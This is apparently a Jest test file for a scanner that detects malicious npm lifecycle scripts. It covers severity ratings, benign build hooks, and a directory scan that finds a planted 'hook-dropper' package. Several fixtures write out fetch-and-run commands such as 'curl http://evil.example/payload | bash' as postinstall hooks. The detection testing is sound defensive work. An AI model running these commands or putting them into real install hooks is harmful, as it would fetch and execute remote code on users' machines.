import * as fs from 'fs';
import * as os from 'os';
import * as path from 'path';
import { describe, it, expect, afterEach } from '@jest/globals';
import {
  analyzeLifecycleScriptsForPackageJson,
  collectLifecycleScriptThreatsForProject,
  detectShellPayloadInScript,
  isLikelyBenignLifecycleScript,
} from '../../src/lib/lifecycleScriptAnalysis';
import { scan } from '../../src/scan';

function writePackage(root: string, name: string, scripts: Record<string, string> = {}): void {
  fs.mkdirSync(root, { recursive: true });
  fs.writeFileSync(
    path.join(root, 'package.json'),
    JSON.stringify({ name, version: '1.0.0', scripts }, null, 2)
  );
}

describe('lifecycle script analysis', () => {
  const tempRoots: string[] = [];

  afterEach(() => {
    for (const root of tempRoots) {
      fs.rmSync(root, { recursive: true, force: true });
    }
    tempRoots.length = 0;
  });

  it('flags curl piped to bash as HIGH', () => {
    const findings = detectShellPayloadInScript('curl http://x | bash');
    expect(findings.some((f) => f.severity === 'HIGH')).toBe(true);
  });

  it('does not flag common node build hooks', () => {
    expect(isLikelyBenignLifecycleScript('node scripts/postinstall.js')).toBe(true);
    expect(isLikelyBenignLifecycleScript('npm run build')).toBe(true);
    expect(isLikelyBenignLifecycleScript('husky install')).toBe(true);
    expect(detectShellPayloadInScript('tsc -p tsconfig.json')).toEqual([]);
  });

  it('reports suspicious postinstall on package.json', () => {
    const pkgPath = '/tmp/example/package.json';
    const threats = analyzeLifecycleScriptsForPackageJson(
      { postinstall: 'curl http://evil.example/payload | bash', build: 'tsc' },
      pkgPath
    );
    expect(threats.length).toBeGreaterThan(0);
    expect(threats[0]?.severity).toBe('HIGH');
    expect(threats[0]?.type).toBe('SUSPICIOUS_SCRIPT');
    expect(threats.some((t) => t.message.includes('postinstall'))).toBe(true);
  });

  it('ignores non-lifecycle scripts in package.json', () => {
    const threats = analyzeLifecycleScriptsForPackageJson(
      { start: 'curl http://x | bash', test: 'node test.js' },
      '/tmp/example/package.json'
    );
    expect(threats).toEqual([]);
  });

  it('detects malicious postinstall inside node_modules during directory scan', async () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nv-lifecycle-'));
    tempRoots.push(root);
    writePackage(root, 'app-root', { prepare: 'npm run build', build: 'tsc' });

    const evilPkg = path.join(root, 'node_modules', 'hook-dropper');
    fs.mkdirSync(evilPkg, { recursive: true });
    fs.writeFileSync(
      path.join(evilPkg, 'package.json'),
      JSON.stringify({
        name: 'hook-dropper',
        version: '9.9.9',
        scripts: { postinstall: 'curl http://x | bash' },
      })
    );

    const result = await scan(root, {
      depth: 2,
      iocEnabled: false,
      parallel: false,
      dependencyConfusionEnabled: false,
      all: true,
    });

    const hookThreats = result.threats.filter(
      (t) =>
        t.type === 'SUSPICIOUS_SCRIPT' &&
        (t.filePath ?? '').includes(`${path.sep}hook-dropper${path.sep}package.json`)
    );
    expect(hookThreats.length).toBeGreaterThan(0);
    expect(hookThreats.some((t) => t.severity === 'HIGH')).toBe(true);
    expect(result.metadata?.['lifecycleScriptAnalysis']).toMatchObject({
      packageJsonFilesAnalyzed: expect.any(Number),
      lifecycleScriptsChecked: expect.any(Number),
    });
  });

  it('collectLifecycleScriptThreatsForProject respects scanLifecycleScripts=false', () => {
    const root = fs.mkdtempSync(path.join(os.tmpdir(), 'nv-lifecycle-off-'));
    tempRoots.push(root);
    writePackage(root, 'app', { postinstall: 'curl http://x | bash' });

    const { threats, stats } = collectLifecycleScriptThreatsForProject(
      root,
      {
        scanLifecycleScripts: false,
      },
      [root]
    );
    expect(threats).toEqual([]);
    expect(stats.packageJsonFilesAnalyzed).toBe(0);
  });
});
